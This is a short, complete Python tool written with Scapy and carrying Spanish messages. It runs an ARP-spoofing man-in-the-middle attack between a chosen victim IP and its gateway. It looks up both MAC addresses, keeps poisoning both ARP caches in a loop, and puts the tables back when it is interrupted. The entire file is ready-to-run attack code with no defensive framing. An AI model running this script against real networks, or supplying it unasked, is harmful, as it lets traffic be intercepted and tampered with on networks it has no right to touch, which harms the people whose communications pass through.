#!/usr/bin/env python3
from scapy.all import *
import time, argparse, sys, os

def get_mac(ip, iface):
    arp_request  = ARP(pdst=ip)
    broadcast    = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt          = broadcast / arp_request
    answered, _  = srp(pkt, iface=iface, timeout=2, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    print(f"[!] No se pudo obtener la MAC de {ip}")
    sys.exit(1)

def poison_arp(target_ip, target_mac, spoof_ip, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )
    sendp(pkt, iface=iface, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(pkt, iface=iface, count=5, verbose=False)

def mitm_attack(victim_ip, gateway_ip, iface, interval, verbose):
    print(f"\n{'='*55}")
    print(f"  ARP MitM Attack")
    print(f"  Victima  : {victim_ip}")
    print(f"  Gateway  : {gateway_ip}")
    print(f"  Interfaz : {iface}")
    print(f"{'='*55}\n")

    print("[*] Obteniendo MACs reales...")
    victim_mac  = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    print(f"[+] MAC Victima  : {victim_mac}")
    print(f"[+] MAC Gateway  : {gateway_mac}")
    print(f"\n[*] Envenenando tablas ARP...")
    print(f"[*] Ctrl+C para detener y restaurar\n")

    sent = 0
    try:
        while True:
            poison_arp(victim_ip,  victim_mac,  gateway_ip, iface)
            poison_arp(gateway_ip, gateway_mac, victim_ip,  iface)
            sent += 1
            if verbose or sent % 10 == 0:
                print(f"[+] Ronda {sent} | Victima: {victim_ip} <-> Gateway: {gateway_ip}")
            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n[!] Deteniendo ataque...")
        print(f"[*] Restaurando tablas ARP...")
        restore_arp(victim_ip,  victim_mac,  gateway_ip, gateway_mac, iface)
        restore_arp(gateway_ip, gateway_mac, victim_ip,  victim_mac,  iface)
        print(f"[+] Restaurado. Total rondas: {sent}")

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo")
        sys.exit(1)
    parser = argparse.ArgumentParser(description="ARP MitM Attack")
    parser.add_argument("-v",  "--victim",   required=True)
    parser.add_argument("-g",  "--gateway",  required=True)
    parser.add_argument("-i",  "--iface",    required=True)
    parser.add_argument("-t",  "--interval", type=float, default=1.0)
    parser.add_argument("--verbose",         action="store_true")
    args = parser.parse_args()
    mitm_attack(args.victim, args.gateway, args.iface, args.interval, args.verbose)

if __name__ == "__main__":
    main()
